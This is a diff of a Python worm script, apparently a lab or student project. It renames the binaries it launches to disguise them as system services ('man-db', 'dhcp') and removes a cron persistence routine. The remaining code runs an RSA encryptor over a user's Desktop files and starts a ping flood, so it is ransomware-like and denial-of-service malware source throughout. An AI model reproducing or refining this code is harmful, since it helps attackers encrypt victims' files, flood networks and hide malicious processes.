@@ -4,24 +4,14 @@ from subprocess import Popen, PIPE
 from crontab import CronTab
 import sys
 
-def Crontab():
-    if os.path.exists('/home/attacker/Public/.Simple_Worm/trigger'):
-        exe = '/home/attacker/Public/.Simple_Worm/trigger'
-    elif os.path.exists('/home/attacker/Desktop/.Backup/trigger'):
-        exe = '/home/attacker/Desktop/.Backup/trigger'
-    cron = CronTab(user = 'attacker')
-    job = cron.new(command = exe)
-    job.minute.every(1)
-    cron.write()
-
 def RSA():
     exe = ''
-    if os.path.exists('/home/attacker/Public/.Simple_Worm/RSA_Encrypt'):
-        exe = '/home/attacker/Public/.Simple_Worm/RSA_Encrypt'
-    elif os.path.exists('/home/attacker/Desktop/.Backup/RSA_Encrypt'):
-        exe = '/home/attacker/Desktop/.Backup/RSA_Encrypt'
+    if os.path.exists('/home/attacker/Public/.Simple_Worm/man-db'):
+        exe = '/home/attacker/Public/.Simple_Worm/man-db'
+    elif os.path.exists('/home/attacker/Desktop/.Backup/man-db'):
+        exe = '/home/attacker/Desktop/.Backup/man-db'
     
-    path = '/home/attacker/Desktop'
+    path = '/home/attacker/Desktop/'
     desktop = os.listdir(path)
     for d in desktop:
         try:
@@ -31,17 +21,14 @@ def RSA():
 
 def PingFlooding():
     p1 = Popen(['ps', '-aux'], stdout=PIPE)
-    p2 = Popen(['grep', 'Loop_ping'], stdin=p1.stdout, stdout=PIPE)
+    p2 = Popen(['grep', 'dhcp'], stdin=p1.stdout, stdout=PIPE)
     p1.stdout.close()
     output = p2.communicate()[0]
     if output == b'':
-        if os.path.exists('/home/attacker/Public/.Simple_Worm/Loop_ping'):
-            os.system('/home/attacker/Public/.Simple_Worm/Loop_ping')
-        elif os.path.exists('/home/attacker/Desktop/.Backup/Loop_ping'):
-            os.system('/home/attacker/Desktop/.Backup/Loop_ping')
+        if os.path.exists('/home/attacker/Public/.Simple_Worm/dhcp'):
+            os.system('/home/attacker/Public/.Simple_Worm/dhcp')
+        elif os.path.exists('/home/attacker/Desktop/.Backup/dhcp'):
+            os.system('/home/attacker/Desktop/.Backup/dhcp')
 
-if sys.argv[1] == 'cron':
-    CronTab()
-else:
-    RSA()
-    PingFlooding()
+RSA()
+PingFlooding()
